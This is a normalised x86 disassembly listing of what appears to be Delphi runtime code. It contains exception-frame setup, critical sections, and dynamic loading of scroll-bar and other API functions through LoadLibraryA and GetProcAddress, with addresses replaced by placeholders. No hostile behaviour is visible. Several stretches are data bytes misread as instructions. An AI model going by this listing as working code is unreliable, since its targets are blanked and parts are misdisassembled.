mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cd5c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40575c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cd5c
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425e00
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424f74
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425e00
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424f74
mov ecx r-xdata
call sub_4057a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fb8
lea eax [ ebp - 0xc ]
call sub_40575c
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
sub edx 0xfffffff8
sub_425fd0
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_426010
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_426040
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4261d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42616d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261d9
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
mov eax esi
xor edx edx
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424f60
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403164
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424f60
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4261e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4262c5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262cc
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404918
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424f60
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405774
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424f60
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405774
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4264fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4265ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ef0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265f6
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404918
lea eax [ ebp - 0x10 ]
call sub_40575c
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424f60
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405774
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_426614
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4266f3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ef0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4266fa
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404918
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424f60
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405774
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_426714
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4057d0
xor eax eax
push ebp
push sub_426763
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42676a
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
lea eax [ ebx + 0xc ]
call sub_40575c
sub_426770
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40434c
xor eax eax
push ebp
push sub_426805
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ef0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4264fc
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42680c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
call sub_426010
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_426040
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4261e0
sub_426830
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424f60
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424f60
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_416a08
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424f60
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_416a08
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_416a08
sub_4268bc
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_425fd0
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403164
mov eax [ esi + 0x14 ]
call sub_403164
mov eax [ esi + 0x10 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40575c
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_426910
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426947
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42694e
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_426958
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42697d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426984
retn
sub_426990
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4269c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4269c8
retn
mov eax [ rw-data ]
call sub_403164
sub_4269d4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_426a08
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_426a30
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_426cb2
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426cd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ce0
retn
sub_426d5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
insd
inc edx
add [ eax + eax ] bl
add [ eax ] al
hlt
sub_426d81
insb
inc edx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ esi + 0x42 ] ch
add [ eax ] bh
outsb
inc edx
add [ esi + ebp * 2 + 0x42 ] al
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
mov eax esi
call sub_403154
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_426dc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_426e08
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_426e60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426e85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e8c
retn
sub_426e98
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_426e50
xor eax eax
push ebp
push sub_42704f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427056
mov eax [ rw-data ]
call sub_426e58
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_427058
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_426e50
xor eax eax
push ebp
push sub_42740b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427412
mov eax [ rw-data ]
call sub_426e58
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4277bc
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4277e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42782c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427833
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403164
call sub_426e98
cmp [ rw-data ] 0x0
jg r-xdata
sub_427854
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427879
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427880
retn
sub_42788c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4278b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278b8
retn
sub_4278c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4278e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278f0
retn
sub_4278fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427921
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427928
retn
sub_427934
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427959
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427960
retn
sub_42796c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427991
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427998
retn
sub_4279a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4279c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4279d0
retn
sub_4279dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427a01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a08
retn
sub_427a14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427a39
push [ fs : eax ]
mov [ fs : eax ] esp
